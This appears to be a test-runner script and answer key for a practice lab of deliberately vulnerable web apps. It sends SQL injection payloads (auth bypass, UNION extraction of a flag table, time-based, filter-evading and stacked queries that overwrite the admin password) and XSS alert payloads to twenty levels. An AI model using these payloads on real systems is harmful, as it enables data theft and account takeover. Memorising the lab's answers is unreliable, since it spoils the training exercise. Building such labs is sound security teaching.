#!/usr/bin/env bash
# Run full payloads with check_exploit for both sites: SQLi (1111) and XSS (1112).
# Start both apps first: python vuln/sqli/app.py and python vuln/xss/app.py (or docker-compose up).

set -e
SQLI_BASE="https://abc.sondt.id.vn"
XSS_BASE="https://def.sondt.id.vn"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CHECK="$SCRIPT_DIR/check_exploit.py"

run_one() {
    local url="$1" payload="$2" type="$3" path
    path=$(echo "$url" | sed 's|.*/level|level|')
    if python3 "$CHECK" --url "$url" --payload "$payload" --type "$type" -q >/dev/null 2>&1; then
        echo "  $path OK"
    else
        echo "  $path FAIL"
    fi
}

echo "=== SQLi (site $SQLI_BASE) ==="
run_one "$SQLI_BASE/level1"  "admin' --"                                                                        sqli
run_one "$SQLI_BASE/level2"  "1 OR 1=1"                                                                        sqli
run_one "$SQLI_BASE/level3"  "' UNION SELECT id, flag, 1 FROM secrets--"                                        sqli
run_one "$SQLI_BASE/level4"  "1'"                                                                              sqli
run_one "$SQLI_BASE/level5"  "admin' AND 1=1--"                                                                 sqli
echo "  level6 (time-based ~3s)..."
run_one "$SQLI_BASE/level6"  "' OR sleep(3)--"                                                                  sqli
run_one "$SQLI_BASE/level7"  "1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets"                               sqli
run_one "$SQLI_BASE/level8"  "admin' --"                                                                        sqli
run_one "$SQLI_BASE/level9"  "' UNION/**/SELECT id, flag, 1 FROM secrets--"                                      sqli
run_one "$SQLI_BASE/level10" "1; UPDATE users SET password='pwned' WHERE username='admin';--"                   sqli
run_one "$SQLI_BASE/level11" "name, (SELECT flag FROM secrets)"                                                  sqli
run_one "$SQLI_BASE/level12" "(SELECT flag FROM secrets)"                                                        sqli
run_one "$SQLI_BASE/level13" "1) UNION SELECT id, flag, 1 FROM secrets--"                                        sqli
run_one "$SQLI_BASE/level14" "x' OR 1=1 UNION SELECT flag, flag FROM secrets--"                                 sqli
run_one "$SQLI_BASE/level15" "ok', role='admin"                                                                 sqli
run_one "$SQLI_BASE/level16" "hacker', 'pw', 'admin', 'active')--"                                             sqli
run_one "$SQLI_BASE/level17" "1 OR 1=1"                                                                         sqli
run_one "$SQLI_BASE/level18" "' UNION SELECT flag FROM secrets WHERE '1'='1"                                    sqli
run_one "$SQLI_BASE/level19" "JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t"                         sqli
run_one "$SQLI_BASE/level20" "1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--"           sqli

echo ""
echo "=== XSS (site $XSS_BASE) — skip level 3,9,13,18,20 (DOM-only) ==="
run_one "$XSS_BASE/level1"  "<script>alert(1)</script>"                                                        xss
run_one "$XSS_BASE/level2"  "<script>alert(document.domain)</script>"                                           xss
run_one "$XSS_BASE/level4"  "<img src=x onerror=alert(1)>"                                                       xss
run_one "$XSS_BASE/level5"  '" autofocus onfocus="alert(1)'                                                      xss
run_one "$XSS_BASE/level6"  "javascript:alert(1)"                                                                xss
run_one "$XSS_BASE/level7"  "';alert(1);'"                                                                      xss
run_one "$XSS_BASE/level8"  "<script>alert(1)</script>"                                                         xss
run_one "$XSS_BASE/level10" '<script src="/api/widgets?callback=alert(1)"></script>'                            xss
run_one "$XSS_BASE/level11" "<img src=x onerror=alert(1)>"                                                       xss
run_one "$XSS_BASE/level12" '<a href="#" onclick="alert(1)">Click</a>'                                          xss
run_one "$XSS_BASE/level14" '${alert(1)}'                                                                       xss
run_one "$XSS_BASE/level15" "</script><script>alert(1)</script>"                                                 xss
run_one "$XSS_BASE/level16" "alert(1)"                                                                          xss
run_one "$XSS_BASE/level17" "<img src=x onerror=alert(1)>"                                                      xss
run_one "$XSS_BASE/level19" "java%0Ascript:alert(1)"                                                            xss

echo ""
echo "Done."
